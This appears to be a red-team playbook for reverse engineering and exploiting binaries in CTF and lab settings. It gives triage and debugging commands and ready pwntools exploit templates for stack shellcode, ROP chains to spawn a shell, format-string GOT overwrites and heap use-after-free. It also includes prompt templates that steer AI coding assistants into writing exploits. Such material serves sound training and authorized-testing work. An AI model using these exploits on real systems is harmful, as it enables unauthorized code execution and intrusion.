# PLAYBOOK: Binary Reverse Engineering & Exploitation
# April 2026 Red Team Stack
# Static analysis · Dynamic analysis · Exploit dev · CTF pwn

---

## Tools in Stack

```bash
# Core RE tools (should be on Kali / HexStrike)
sudo apt install gdb pwndbg pwntools ghidra radare2 binutils

# Enhanced GDB (install pwndbg or peda)
git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh

# Python exploit library
pip install pwntools

# Binary analysis
sudo apt install ltrace strace checksec file strings objdump readelf

# Optional: IDA Pro (commercial), Binary Ninja (commercial)
# Free: Ghidra (NSA), Cutter (radare2 GUI)
```

---

## PHASE 1 — BINARY TRIAGE

```bash
# First steps on any binary
kali_exec("file [BINARY]")
kali_exec("checksec --file [BINARY]")
# Look for: RELRO, Stack Canary, NX, PIE, RPATH

kali_exec("strings [BINARY] | head -100")
kali_exec("strings [BINARY] | grep -E 'flag\|CTF\|password\|secret\|http'")

kali_exec("readelf -h [BINARY]")  # ELF header info
kali_exec("readelf -s [BINARY]")  # Symbols (function names if not stripped)
kali_exec("objdump -d [BINARY] | head -100")  # Disassembly

# Dependencies
kali_exec("ldd [BINARY]")
kali_exec("ltrace ./[BINARY]")   # Library calls
kali_exec("strace ./[BINARY]")   # System calls

# Quick dynamic run
kali_exec("./[BINARY]")
kali_exec("echo 'AAAA' | ./[BINARY]")
kali_exec("./[BINARY] < /dev/urandom &")
```

**Checksec output interpretation:**
```
RELRO: Full → GOT overwrite difficult
       Partial → GOT writable after load
       None → GOT fully writable

Canary: Yes → Stack overflow harder (need leak or bypass)
        No  → Classic stack overflow possible

NX/DEP: Yes → No shellcode on stack (need ROP)
        No  → Shellcode on stack works

PIE: Yes → Base address randomized (need leak for ROP)
     No  → Fixed addresses, easier ROP gadget usage

ASLR: System-level (check /proc/sys/kernel/randomize_va_space)
      0 = disabled, 1 = partial, 2 = full
```

---

## PHASE 2 — STATIC ANALYSIS (GHIDRA)

```bash
# Launch Ghidra headless analysis
kali_exec("ghidra_headless /tmp/ghidra_proj TestProj -import [BINARY] -postScript PrintAST.java")

# Or via GUI:
kali_exec("ghidraRun &")
# File → New Project → Import binary → Analysis → All

# Key Ghidra workflows:
# 1. Find main() → Decompiler view
# 2. Search → Strings → look for flags, passwords, URLs
# 3. References → find where strings are used
# 4. Function graph → understand control flow
# 5. Symbol tree → all functions, exports, imports

# Export decompiled C for analysis with LLM:
# Ghidra → File → Export Program → C/C++ header

# Using Claude Code to analyze decompiled output:
"Analyze this decompiled C code from Ghidra.
Find: vulnerabilities, logic flaws, hardcoded values, crypto misuse.
[PASTE DECOMPILED CODE]"
```

---

## PHASE 3 — DYNAMIC ANALYSIS (GDB + PWNDBG)

```bash
# Basic GDB session
kali_exec("gdb ./[BINARY]")
# GDB commands:
# r [args]          → run
# r < input.txt     → run with input
# b *main           → breakpoint at main
# b *0x401234       → breakpoint at address
# c                 → continue
# ni                → next instruction
# si                → step into
# x/20wx $esp       → examine stack (20 words)
# x/s $rdi          → examine string at rdi
# info registers    → all registers
# bt                → backtrace

# Pwndbg enhanced commands:
# context           → registers, stack, disasm all at once
# heap              → heap chunks
# telescope $rsp    → smart stack display
# checksec          → binary protections
# cyclic 200        → De Bruijn sequence for offset finding

# Find buffer overflow offset
kali_exec("gdb ./[BINARY] -ex 'run <<< $(python3 -c \"import pwn; pwn.cyclic(200)\")'")
# After crash: gdb -ex 'x/s $rsp' or check EIP/RIP value
# Then: pwn.cyclic_find(0x6161616b) → gives offset
```

---

## PHASE 4 — EXPLOIT DEVELOPMENT

### Stack Buffer Overflow (No Protections)
```python
# exploit_basic.py — for CTF/lab binary with no NX, no canary
from pwn import *

binary = './[BINARY]'
elf = ELF(binary)
p = process(binary)
# OR: p = remote('[IP]', [PORT])

# Crash offset found via cyclic
OFFSET = 72

# If NX disabled: shellcode
shellcode = asm(shellcraft.sh())

payload = flat([
    shellcode,
    b'A' * (OFFSET - len(shellcode)),
    p64(0xdeadbeef)  # Return address → stack where shellcode is
])

p.sendline(payload)
p.interactive()
```

### ROP Chain (NX Enabled, No PIE)
```python
# exploit_rop.py — NX enabled, fixed addresses
from pwn import *

binary = './[BINARY]'
elf = ELF(binary)
rop = ROP(elf)

# Find gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]  # Stack alignment

# Find /bin/sh string
binsh = next(elf.search(b'/bin/sh\x00'))

# Build payload
payload = flat([
    b'A' * OFFSET,
    ret_gadget,      # Align stack (required for system() on 64-bit)
    pop_rdi,
    binsh,
    elf.sym.system
])

p.sendline(payload)
p.interactive()
```

### Format String Attack
```python
# Find format string vulnerability
kali_exec("python3 -c \"print('%p ' * 20)\" | ./[BINARY]")
# If addresses appear → format string vuln

# Exploit: read arbitrary memory
kali_exec("python3 -c \"import struct; print(struct.pack('<Q', 0x601060) + b' %7\$s')\" | ./[BINARY]")

# Write arbitrary memory (GOT overwrite)
from pwn import *
p = process('./[BINARY]')

target = elf.got['printf']  # Address to overwrite
value = elf.sym['system']   # Value to write

payload = fmtstr_payload(6, {target: value})
p.sendline(payload)
p.sendline(b'/bin/sh')
p.interactive()
```

### Heap Exploitation (Use-After-Free)
```python
# Analyze heap with pwndbg
# heap → show all chunks
# vis_heap_chunks → visual heap layout
# find_fake_fast → fake fastbin chunks

# Basic UAF → tcache poisoning (libc 2.27-2.31)
# 1. Allocate chunk A
# 2. Free chunk A (goes into tcache)
# 3. Use freed pointer → read/write to freed chunk
# 4. Overwrite fd pointer in tcache bin
# 5. Allocate again → get arbitrary chunk at fd
```

---

## PHASE 5 — CTF-SPECIFIC PATTERNS

```bash
# Using PentestGPT for CTF pwn challenges:
kali_exec("pentestgpt --ctf --category pwn --challenge [BINARY]")

# Claude Code prompt for CTF:
"I'm working on an authorized CTF challenge (pwn category).
Binary: [BINARY_NAME]
checksec output: [OUTPUT]
File type: [OUTPUT]
I've found: [WHAT YOU KNOW]
Ghidra decompile of main(): [CODE]
Help me find the vulnerability and develop an exploit."

# Common CTF pwn checklist:
# □ ret2win (call win function directly)
# □ ret2libc (leak libc → call system)
# □ ret2plt (use PLT stubs)
# □ format string → GOT overwrite
# □ heap: UAF, double-free, heap overflow
# □ integer overflow → buffer overflow
# □ off-by-one → heap/stack corruption
# □ race condition → TOCTOU

# Automated: pwntools solve template
kali_write_file("/tmp/solve_template.py", """
#!/usr/bin/env python3
from pwn import *

# Context
context.binary = '[BINARY]'
context.arch = 'amd64'  # or 'i386'
context.log_level = 'info'

# Binary and libs
elf = ELF('[BINARY]')
# libc = ELF('libc.so.6')  # if needed

def conn():
    if args.REMOTE:
        return remote('[IP]', [PORT])
    return process('[BINARY]')

def main():
    p = conn()
    
    # === EXPLOIT HERE ===
    
    p.interactive()

if __name__ == '__main__':
    main()
""")
```

---

## PHASE 6 — WINDOWS BINARY ANALYSIS

```bash
# PE analysis
kali_exec("pe-tree [BINARY.exe]")
kali_exec("pecheck [BINARY.exe]")
kali_exec("strings [BINARY.exe] | grep -iE 'password|secret|api|key|http'")

# Wine for running Windows binaries on Kali
kali_exec("wine [BINARY.exe]")
kali_exec("winedbg --gdb [BINARY.exe]")

# x64dbg / OllyDbg equivalent for analysis:
# Use Windows VM + x64dbg (free, excellent)
# Or: Ghidra handles PE format natively

# DLL analysis
kali_exec("dumpbin /exports [DLL.dll] 2>/dev/null || wine dumpbin.exe /exports [DLL.dll]")
```

---

## LLM-Assisted RE Workflow

```
1. Triage binary → get checksec, strings, file type
2. Ghidra static analysis → decompile key functions
3. Paste decompiled code to Claude Code:
   "Find vulnerabilities in this decompiled code"
4. GDB dynamic analysis → confirm finding
5. pwntools exploit development
6. Test locally → then remote if CTF/authorized

Claude Code is VERY good at:
  → Reading decompiled Ghidra output
  → Identifying C vulnerability patterns
  → Writing initial pwntools exploit templates
  → Explaining assembly instructions
  → Finding crypto misuse patterns
  → Suggesting gadget chains for ROP
```

---

*April 2026 | Binary RE — legal CTF and authorized testing only*
